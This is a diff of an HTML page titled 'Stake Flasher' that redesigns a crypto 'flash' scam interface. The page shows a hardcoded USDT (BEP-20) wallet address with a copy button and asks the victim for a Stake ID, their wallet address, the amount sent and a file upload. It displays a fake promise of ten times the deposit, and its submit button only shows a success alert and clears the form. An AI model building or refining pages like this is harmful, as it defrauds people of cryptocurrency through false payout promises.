@@ -1,40 +1,155 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Stake Flasher</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 20px; }
-        .container { max-width: 400px; margin: auto; background: #1e293b; padding: 20px; border-radius: 10px; }
-        input, select, button { width: 100%; padding: 10px; margin-top: 10px; border-radius: 5px; border: none; }
-        input[type="file"] { color: white; }
-        button { background-color: green; color: white; font-weight: bold; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>Stake Flasher</h2>
-        <p>Select Cryptocurrency</p>
-        <select disabled>
-            <option>USDT (BEP-20)</option>
-        </select>
-        <img src="wallet_qr.png" alt="QR Code" width="200">
-        <p style="word-wrap: break-word;">0x24f551eae922e4a72b05f678626e86ee241461a0</p>
-        <button onclick="copyAddress()">Copy Address</button>
+<meta charset="UTF-8">
+<title>Stake Flasher</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        <input type="text" placeholder="Stake ID">
-        <input type="text" placeholder="Your Wallet Address">
-        <input type="text" placeholder="Amount Sent (USD)">
-        <input type="file">
-        <button>Submit</button>
+<style>
+body{
+    margin:0;
+    font-family: Arial, Helvetica, sans-serif;
+    background:#0b1424;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+.card{
+    width:100%;
+    max-width:420px;
+    background:#1f2a3a;
+    border-radius:14px;
+    padding:22px;
+    box-shadow:0 0 25px rgba(0,0,0,0.6);
+}
+h2{
+    text-align:center;
+    margin:0;
+    margin-bottom:6px;
+    color:#fff;
+}
+.subtitle{
+    text-align:center;
+    font-size:13px;
+    opacity:0.7;
+    margin-bottom:12px;
+}
+select{
+    width:100%;
+    padding:10px;
+    border-radius:6px;
+    border:none;
+    background:#d1d5db;
+    color:#000;
+    font-weight:600;
+}
+.qr-box{
+    background:#fff;
+    width:230px;
+    margin:14px auto;
+    padding:10px;
+}
+.address{
+    color:#cbd5e1;
+    font-size:13px;
+    text-align:center;
+    word-break:break-all;
+    margin-bottom:10px;
+}
+.btn-green{
+    width:100%;
+    background:#0a8f08;
+    color:#fff;
+    border:none;
+    padding:10px;
+    border-radius:4px;
+    font-weight:700;
+    cursor:pointer;
+}
+input{
+    width:100%;
+    padding:10px;
+    border-radius:4px;
+    border:none;
+    margin-top:10px;
+}
+input[type="file"]{
+    background:#fff;
+}
+.calc{
+    margin-top:8px;
+    font-size:13px;
+    color:#22c55e;
+    text-align:center;
+    font-weight:600;
+}
+.submit{
+    margin-top:12px;
+}
+</style>
+</head>
+
+<body>
+<div class="card">
+
+    <h2>Stake Flasher</h2>
+    <div class="subtitle">Select Cryptocurrency</div>
+
+    <select disabled>
+        <option>USDT (BEP-20)</option>
+    </select>
+
+    <div class="qr-box">
+        <img src="qr.png" width="210">
     </div>
 
-    <script>
-        function copyAddress() {
-            navigator.clipboard.writeText("0x24f551eae922e4a72b05f678626e86ee241461a0");
-            alert("Address Copied!");
-        }
-    </script>
+    <div class="address">
+        0x24f551eae922e4a72b05f678626e86ee241461a0
+    </div>
+
+    <button class="btn-green" onclick="copyAddr()">Copy Address</button>
+
+    <input id="stake" type="text" placeholder="Stake ID">
+    <input id="wallet" type="text" placeholder="Your Wallet Address">
+    <input id="amount" type="number" placeholder="Amount Sent (USD)" oninput="calcAmt()">
+    <input id="file" type="file">
+
+    <div id="calc" class="calc"></div>
+
+    <button class="btn-green submit" onclick="submitForm()">Submit</button>
+
+</div>
+
+<script>
+function copyAddr(){
+    navigator.clipboard.writeText(
+        "0x24f551eae922e4a72b05f678626e86ee241461a0"
+    );
+    alert("Address Copied");
+}
+
+function calcAmt(){
+    let amt = document.getElementById("amount").value;
+    let box = document.getElementById("calc");
+
+    if(amt >= 100){
+        box.innerText = "Processing Amount: 10× = " + (amt * 10) + " USDT";
+    } else {
+        box.innerText = "";
+    }
+}
+
+function submitForm(){
+    alert("Submitted Successfully");
+
+    document.getElementById("stake").value = "";
+    document.getElementById("wallet").value = "";
+    document.getElementById("amount").value = "";
+    document.getElementById("file").value = "";
+    document.getElementById("calc").innerText = "";
+}
+</script>
+
 </body>
 </html>
